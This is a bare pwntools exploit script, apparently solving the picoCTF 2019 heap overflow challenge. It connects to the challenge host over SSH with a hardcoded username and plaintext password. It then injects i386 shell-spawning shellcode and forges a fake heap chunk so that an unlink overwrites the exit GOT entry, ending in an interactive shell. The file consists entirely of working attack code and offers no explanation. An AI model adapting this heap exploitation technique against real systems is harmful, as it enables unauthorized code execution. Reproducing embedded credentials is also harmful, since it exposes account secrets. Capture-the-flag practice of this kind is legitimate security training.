from pwn import *

context.binary = './vuln'

sh = ssh(host='2019shell1.picoctf.com', user='jamesyoung', password='pBCNtaNiAc7Fs&F')
server = sh.process('vuln', cwd='/problems/heap-overflow_6_b4a1244485bc8fdf27646e1db83dc360')

print(server.recvline())
leak = int(server.recvline())

print hex(leak)

exit_got = 0x0804d02c

shellcode = 'a'*8
shellcode += asm('''
  jmp sc
  {}
sc:
  nop
  '''.format('nop\n'*11) + shellcraft.i386.linux.sh())

shellcode = shellcode.ljust(0x2a0 - 0x4)
shellcode += p32(0x49).ljust(0x48)
shellcode += p32(0x101)

print(server.recvuntil('fullname'))
server.sendline(shellcode)


fake_chunk = p32(0x101)
fake_chunk += p32(exit_got - 12) 
fake_chunk += p32(leak + 8)
fake_chunk = fake_chunk.ljust(0x100 - 0x4) + p32(0x101)

payload = 'a'*(0x100 - 4) + fake_chunk

print(server.recvuntil('lastname'))
server.sendline(payload)

server.interactive()
